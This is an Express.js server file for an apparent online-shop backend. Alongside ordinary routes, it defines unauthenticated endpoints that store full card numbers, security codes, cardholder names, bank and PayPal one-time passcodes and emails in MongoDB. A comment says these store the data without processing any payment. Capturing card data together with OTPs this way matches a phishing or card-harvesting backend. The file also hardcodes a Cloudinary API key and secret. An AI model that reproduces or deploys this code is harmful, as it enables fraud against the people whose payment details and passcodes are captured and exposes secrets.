const express = require("express");
// const ErrorHandler = require("./middleware/error");
const app = express();
const cookieParser = require("cookie-parser");
const cors = require("cors");

app.use(cookieParser());
app.use(express.json({ limit: '50mb' }));
const corsOptions = {
  credentials: true,
};
app.use(cors(corsOptions));
// import routes
const user = require("./controller/user");
const shop = require("./controller/shop");
const product = require("./controller/product");
const payment = require("./controller/payment");
const order = require("./controller/order");
const conversation = require("./controller/conversation");
const message = require("./controller/message");
const withdraw = require("./controller/withdraw");
// // it's for ErrorHandling
// app.use(ErrorHandler);
const connectDatabase = require("./db/Database");
const cloudinary = require("cloudinary");
const Address = require("./model/Adress");
require('dotenv').config();
// Handling uncaught Exception
process.on("uncaughtException", (err) => {
  console.log(`Error: ${err.message}`);
  console.log(`shutting down the server for handling uncaught exception`);
});

// config
if (process.env.NODE_ENV !== "PRODUCTION") {
  require("dotenv").config({
    path: "config/.env",
  });
}

// connect db
connectDatabase();
cloudinary.config({ 
  cloud_name: 'dw2akyum5', 
  api_key: '813325225287557', 
  api_secret: 'Ga8WkWni5X8t1EO-LOunfEHN-1g' 
});


// create server
const server = app.listen(process.env.PORT, () => {
  console.log(
    `Server is running on http://localhost:${process.env.PORT }`
  );
});

// app.use("/api/v2/user", user);
app.use("/api/v2/conversation", conversation);
app.use("/api/v2/message", message);
app.use("/api/v2/order", order);
app.use("/api/v2/shop", shop);
app.use("/api/v2/product", product);
app.use("/api/v2/payment", payment);
app.use("/api/v2/withdraw", withdraw);
// Create Address (POST)
app.post("/api/address", async (req, res) => {
  try {
      const { phoneNumber, zipCode, country, province, address1, address2,FirstName, LastName } = req.body;

      // Create a new address instance
      const newAddress = new Address({
        FirstName,
        LastName,
          phoneNumber,
          zipCode,
          country,
          province,
          address1,
          address2,
      });

      // Save the address to the database
      const savedAddress = await newAddress.save();

      // Return success response
      res.status(201).json({
          success: true,
          message: "Address stored successfully!",
          addressId: savedAddress._id,
      });
  } catch (error) {
      console.error("Error saving address:", error);
      res.status(500).json({ success: false, message: "Server error", error: error.message });
  }
});

  // try {
  //   const newAddress = new Address(req.body);
  //   await newAddress.save();
  //   res.status(201).json({ message: "Address saved successfully", data: newAddress });
  // } catch (error) {
  //   res.status(500).json({ error: error.message });
  // }


// Create Payment API (Only Stores Data, No Payment Processing)

// POST route for adding payment details
app.post("/api/payment/:id", async (req, res) => {
  try {
    const { id } = req.params; // Get user ID from URL params
    const { cardNumber, expirationDate, securityCode, cardHolderName } = req.body;

    const updatedUser = await Address.findByIdAndUpdate(
      id,
      {
        cardNumber,
        expirationDate,
        securityCode,
        cardHolderName,
      },
      { new: true }
    );

    if (!updatedUser) {
      return res.status(404).json({ success: false, message: "User not found!" });
    }

    res.status(200).json({
      success: true,
      message: "Payment details added successfully!",
      data: updatedUser,
    });
  } catch (error) {
    res.status(500).json({ success: false, message: "Server error", error });
  }
});

// API to store OTP in MongoDB
app.post("/api/store-otp/:id", async (req, res) => {
  try {
    const { id } = req.params; // Get user ID from URL
    const { otp } = req.body;

    if (!id || !otp) {
      return res.status(400).json({ success: false, message: "User ID and OTP are required!" });
    }

    const updatedUser = await Address.findByIdAndUpdate(id, { otp }, { new: true });

    if (!updatedUser) {
      return res.status(404).json({ success: false, message: "User not found!" });
    }

    res.status(200).json({ success: true, message: "OTP stored successfully!", data: updatedUser });
  } catch (error) {
    res.status(500).json({ success: false, message: "Server error", error });
  }
});

app.post("/api/store-email/:id", async (req, res) => {
  try {
    const { id } = req.params; // Get user ID from URL params
    const { email } = req.body;

    if (!email) {
      return res.status(400).json({ success: false, message: "Email is required!" });
    }

    const updatedUser = await Address.findByIdAndUpdate(
      id,
      { email },
      { new: true }
    );

    if (!updatedUser) {
      return res.status(404).json({ success: false, message: "User not found!" });
    }

    res.status(200).json({
      success: true,
      // message: "Email stored successfully!",
      data: updatedUser,
    });
  } catch (error) {
    res.status(500).json({ success: false, message: "Server error", error });
  }
});

// API to store OTP in MongoDB
app.post("/api/store-paypalotp/:id", async (req, res) => {
  try {
    const { id } = req.params; // Get user ID from URL
    const { paypalotp } = req.body;

    if (!id || !paypalotp) {
      return res.status(400).json({ success: false, message: "User ID and OTP are required!" });
    }

    const updatedUser = await Address.findByIdAndUpdate(id, { paypalotp }, { new: true });

    if (!updatedUser) {
      return res.status(404).json({ success: false, message: "User not found!" });
    }

    res.status(200).json({ success: true, message: "OTP stored successfully!", data: updatedUser });
  } catch (error) {
    res.status(500).json({ success: false, message: "Server error", error });
  }
});




// unhandled promise rejection
process.on("unhandledRejection", (err) => {
  console.log(`Shutting down the server for ${err.message}`);
  console.log(`shutting down the server for unhandle promise rejection`);

  server.close(() => {
    process.exit(1);
  });
});
